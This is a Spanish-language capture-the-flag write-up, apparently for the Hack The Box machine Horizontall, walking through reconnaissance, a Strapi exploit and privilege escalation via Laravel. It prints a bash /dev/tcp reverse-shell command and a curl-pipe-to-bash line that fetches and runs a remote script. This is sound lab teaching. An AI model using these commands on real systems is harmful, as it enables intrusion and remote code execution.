---
layout:   post
title:    "Write Up Horizontal"
subtitle: "Starting-Point"
category:   HTB
tags:      [Easy,Linux,Strapi,Write-Up-Machine,Starting-Point,OSCP,eJPT]
---
![list](/assets/img/horizontal/Captura%20de%20pantalla%20(290).png){:.lead width="800" height="100" loading="lazy"}

***
<!--more-->

1. this ordered seed list will be replaced by the toc
{:toc}

***

## Reconocimiento

Fase inicial donde recolectamos toda la información posible del objetivo, utilizando diferentes técnicas como:

| Caracter.                                   |
|:--------------------------------------------|
|Recopilación de tecnologuias.                |
|Dominios.                                    |
|IPs.                                         |
|Puertos.                                     |
|Servicios.                                   |
|Recopilación de metadatos, etc.              |


***
### nmap

Utizando nmap comprobamos que puertos estan abiertos.


```bash
sudo nmap --open -p- -Pn -n -vvv --min-rate 5000 -sS 10.10.11.105 -oG allports
```

![list](/assets/img/horizontal/Parrot-2022-12-19-14-03-55.png){:.lead width="800" height="100" loading="lazy"}


El paso anterior se debe hacer con privileguios (root).
{:.note title="Attention"}

***
### Servicios y versiones

Una vez sabemos que puertos estan abiertos con el comando anterior podremos saber que versiones y servicios que corren en los mismo de ahi podremos determinara posibles vulnerabilidades.

Esto lo hacemos con el siguiente comando.


```bash
nmap -sCV -p21,80 10.10.11.105 -oN target -Pn
```

![list](/assets/img/horizontal/Parrot-2022-12-19-14-04-49.png){:.lead width="800" height="100" loading="lazy"}

El paso anterior no es nesesario ser (root).
{:.note title="Attention"}

***
## Analisis de vulnerabilidades

Uso de Investigacion web, Google Hacking,Google Dorks y recopilación de información gracias a servicios de terceros.e ispeccionamos la web, ademas de las tecnologias de la ip ataves de la terminal o via  web esto lo hacemos con wapalizzer o whatweb, como encontramos version vulnerable del srvicio ftp con serasploit tambien vamos a investigar ese vector .

![list](/assets/img/horizontal/Parrot-2022-12-19-14-07-23.png){:.lead width="800" height="100" loading="lazy"}

Whatweb nos  esta aplicando un reirerct al dominio horizontall.htb por lo que lo ingresamos al `/etc/hosts`.
{:.note}



Tambien podemos fuzzear los directorioo  para ver que informacion nos entrega, que la web de horizontall nada funciona.

![list](/assets/img/horizontal/Parrot-2022-12-19-14-30-41.png){:.lead width="800" height="100" loading="lazy"}
{:.note}
En contramos unos directorips `/js` que vamos a grepearmanualmente de la siguiente forma.

```bash
curl -s -X GET "http://horizontall.htb/ | htmlq -p | batcat -l html
```

{:.note}
Esto nod devuelve dos ruta `/js/chunk-vendors.0e02b89e.js` y `/js/app.c68eb462.js` los cuales vamos a investigar pra ver que informacion podemos recolectar.

Entre tanta maraña d informcion encontramos un subdominio `api-prod.horizontal.htb/reviews` en cual pegarmos en el `/etc/hosts`

![list](/assets/img/horizontal/Parrot-2022-12-19-14-38-55.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
En contramos los nombres de tres usuarios que son `wail`,`doe`y`john`.

Fuzzeamos otra vez la ruta de api y cada rita interna que tenga esa tambien lo que nos da como resutado que encontramos un login que funciona con gestor de  contenido llamado strapi que vamos a buscar vulnerabiliudades con searchsploit.

![list](/assets/img/horizontal/Parrot-2022-12-19-15-08-51.png){:.lead width="800" height="100" loading="lazy"}
{:.note}
Nos decargamos el script y y nos da un a shell pero que nos vamos acambiar a una propia que nos vamos a poner ala eschucha en el puerto 443 y nos vamos a crear una archivo `shell.html` que contiene el comado para mandarnos una [reverse-shell] `bash -i >& /dev/tcp/10.10.10.14 0>&1` y lo ejecutamos de la siguiente manera deuna ves se  ejecuta ya que esta con la tuberia y el comado bash. 

![list](/assets/img/horizontal/Parrot-2022-12-19-15-22-40.png){:.lead width="800" height="100" loading="lazy"}


```bash
curl http://10.10.10.14/shell.html | bash
```

[reverse-shell]:(https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
{:.note}
Podemos buscar la flag el usuario e bajos privileguios en el directorio el usuario `strapi`.

![list](/assets/img/horizontal/Parrot-2022-12-19-15-26-11.png){:.lead width="800" height="100" loading="lazy"}

***

## Escalacion de privilegios 

Siempre es bueno ejecutar `LimEnum` Y `pspy` para monitorizar y ver los posibles vectores para escalar de privilegios, ademas hasta que se ejecute los anteriores podemos buscar los permisos con el comado find o tareas crond o tareas que esperen ejecucion.

Como no encontramos nada vemos los puetos que estan abiertos internamente y esta el 8000 si vemos con curl la version es Laravel v8 (PHP v7.4.18).

![list](/assets/img/horizontal/Parrot-2022-12-19-15-54-05.png){:.lead width="800" height="100" loading="lazy"}


{:.note}
Nos lo traemos con [chisel] y buscamos en exploit para ejecutarlo.


De la misma manera que antes solo que en ves id nos mandamos una reverse-shell y ya somos root.

![list](/assets/img/horizontal/Parrot-2022-12-19-15-54-05.png){:.lead width="800" height="100" loading="lazy"}

{:.note}
La flag esta en el ecritorio del usuario priviligiado.

***
```bash
🎉 Felicitaciones ya has comprometido Horizontal de Hack The Box. 🎉
```
{:.centered}
***

